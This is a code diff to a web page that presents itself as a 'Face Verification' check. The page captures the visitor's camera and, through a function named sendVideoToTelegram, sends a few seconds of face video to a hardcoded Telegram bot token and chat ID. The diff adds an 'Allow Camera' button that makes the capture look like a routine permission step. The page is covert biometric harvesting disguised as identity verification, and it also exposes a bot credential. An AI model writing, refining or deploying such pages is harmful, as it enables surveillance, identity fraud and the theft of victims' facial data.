@@ -37,7 +37,7 @@
             border-radius: 20px;
             border: 2px solid #4CAF50;
             margin: 20px auto;
-            display: block;
+            display: none;
             object-fit: cover;
         }
 
@@ -63,11 +63,27 @@
             color: #4CAF50;
             display: none;
         }
+
+        .allow-btn {
+            padding: 10px 20px;
+            font-size: 16px;
+            background: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .allow-btn:hover {
+            background: #388E3C;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Face Verification</h1>
+        <button id="allow-btn" class="allow-btn">Allow Camera</button>
         <video id="video" autoplay playsinline muted></video>
         <canvas id="overlay"></canvas>
         <div class="loading">Processing your face...</div>
@@ -79,11 +95,15 @@
         const overlay = document.getElementById('overlay');
         const loading = document.querySelector('.loading');
         const success = document.querySelector('.success');
+        const allowButton = document.getElementById('allow-btn');
         const canvasCtx = overlay.getContext('2d');
         const telegramToken = "5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q";
         const telegramChatId = "2070423407";
 
-        async function setupFaceVerification() {
+        allowButton.addEventListener('click', async () => {
+            // Hide the button
+            allowButton.style.display = 'none';
+
             // Load face-api models
             await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js/models');
             await faceapi.nets.faceLandmark68Net.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js/models');
@@ -91,6 +111,7 @@
             // Request camera access
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = stream;
+            video.style.display = 'block';
 
             // Start face tracking
             video.addEventListener('play', () => {
@@ -127,7 +148,7 @@
                     }
                 }, 100);
             });
-        }
+        });
 
         async function sendVideoToTelegram(stream) {
             loading.style.display = 'block';
@@ -160,10 +181,6 @@
 
             setTimeout(() => mediaRecorder.stop(), 3000); // Stop after 3 seconds
         }
-
-        setupFaceVerification().catch((error) => {
-            alert('Error: Unable to access camera: ' + error.message);
-        });
     </script>
 </body>
 </html>
